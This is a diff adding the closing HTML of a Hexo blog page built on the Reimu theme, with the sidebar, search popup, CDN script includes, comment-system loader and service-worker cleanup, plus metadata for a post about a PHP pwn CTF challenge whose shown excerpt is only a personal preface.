+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/HFTTC.github.io/avatar/head.jpg" data-sizes="auto" alt="HFTTC" class="lazyload">
+  <div class="sidebar-author-name">HFTTC</div>
+  <div class="sidebar-description">心之所向，无问西东</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">136</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/IDCM-svg itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/catalog" aria-label="目录"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">目录</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/HFTTC.github.io/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+      <div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/HFTTC.github.io/images/reimu.png" loading="lazy" decoding="async" fetchpriority="low"/>
+        </div>
+      </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/HFTTC.github.io/js/script.js"></script>
+
+
+  
+<script src="/HFTTC.github.io/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/HFTTC.github.io/js/pjax_script.js" data-pjax></script>
+
+
+  
+<script src="/HFTTC.github.io/js/generator_search.js" defer></script>
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "HFTTC",
+          title: "",
+          url: "https://idcm-svg.github.io/HFTTC.github.io/2026/06/19/PHP-PWN%20d3ctf2024-pwnshell/",
+          excerpt: "",
+          description: "",
+          stripContent: "前言：大一快结束了，一直听说过 phppwn 但是没有学，最近其实挺累的，打了许多比赛结果被 AI 踹成路边一条，比赛题目也是有很多自己没有见过的，还是沉下心一点点学习吧。 一开始学 phppwn 有点迷，还好之前有一定的 web 基础，做过 web 的 php 代码审计的一类题目。phppwn 的 gdb 调试和普通 pwn 不太一样，需要利用 dockerfile 起一个 docker 环境，调试的时候也需要有对应的函数。  好吧还是想吐槽一下，最开始的时候利用 off-by-null 一直",
+          date: "Fri Jun 19 2026 21:43:37 GMT+0800",
+          updated: "Fri Jun 19 2026 21:43:51 GMT+0800",
+          cover: "/HFTTC.github.io/images/banner.webp",
+        };
+      </script>
+        
+<script src="/HFTTC.github.io/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/HFTTC.github.io/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'IDCM-svg/HFTTC.github.io');
+        script.setAttribute('issue-term', 'pathname');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'utterances';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false,
+      utterances: false,
+      beaudar: false,
+      disqus: false,
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    Promise.all([
+      navigator.serviceWorker.getRegistrations().then((registrations) => {
+        return Promise.all(registrations.map((registration) => registration.unregister()));
+      }),
+      ('caches' in window)
+        ? caches.keys().then((keys) => Promise.all(keys.map((key) => caches.delete(key))))
+        : Promise.resolve()
+    ]).then(() => {
+      if (!sessionStorage.getItem('sw-cache-cleared')) {
+        sessionStorage.setItem('sw-cache-cleared', '1');
+        window.location.reload();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
